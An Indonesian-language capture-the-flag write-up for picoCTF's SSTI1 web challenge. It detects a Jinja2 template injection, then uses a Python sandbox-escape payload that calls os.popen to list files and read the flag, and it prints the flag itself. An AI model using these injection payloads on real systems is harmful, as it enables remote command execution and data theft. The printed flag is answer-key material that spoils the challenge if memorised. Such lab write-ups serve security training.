Kategori : Web Exploitation 
Tingkat Kesulitan : Easy
Tujuan : Mendapatka "flag" tersembunyi di server melalui celah keamanan Server-Side Template Injection(SSTI1)

1. Analisis Awal
Tantangan ini menyediakan sebuah situs web sederhana dengan fitur "announce". Berdasarkan deskripsi dan tag tantangan, dicurigai adanya kerentanan pada cara server memproses input pengguna ke dalam template engine.

Identifikasi Kerentanan
Langkah pertama adalah melakukan fuzzing sederhana pada kolom input untuk menentukan jenis template engine yang digunakan. Input yang dimasukkan:
{{ 7 * 7 }}
Hasil: Halaman menampilkan angka 49.
Kesimpulan: Situs ini menggunakan Jinja2 (Python) dan melakukan eksekusi kode di sisi server tanpa sanitasi input yang memadai.

2. Pengumpulan Informasi (Information Gathering)
Setelah memastikan adanya SSTI, langkah berikutnya adalah memeriksa variabel konfigurasi aplikasi untuk melihat apakah flag disimpan di sana. Input yang digunakan:
{{ config }}
Hasil: Informasi konfigurasi muncul, namun tidak ditemukan string yang diawali dengan format picoCTF{...}. Maka, diperlukan akses lebih dalam ke sistem file server.

3. Eksploitasi (Remote Code Execution)
Karena flag tidak ada di memori aplikasi, kita harus melakukan Sandbox Escape untuk menjalankan perintah sistem operasi (RCE) guna mencari file di server.

Langkah A: Mencari File
Kita menggunakan navigasi objek Python untuk memanggil modul os dan menjalankan perintah ls:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
Hasil: Muncul daftar file: app.py dan flag

Langkah B: Membaca File Flag
Setelah mengetahui nama filenya adalah flag, kita menjalankan perintah cat untuk membaca isinya:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
Hasil Akhir: Flag berhasil didapatkan (picoCTF{s3rv3r_5id3_t3mpl4t3_1nj3ct1on_succc355}).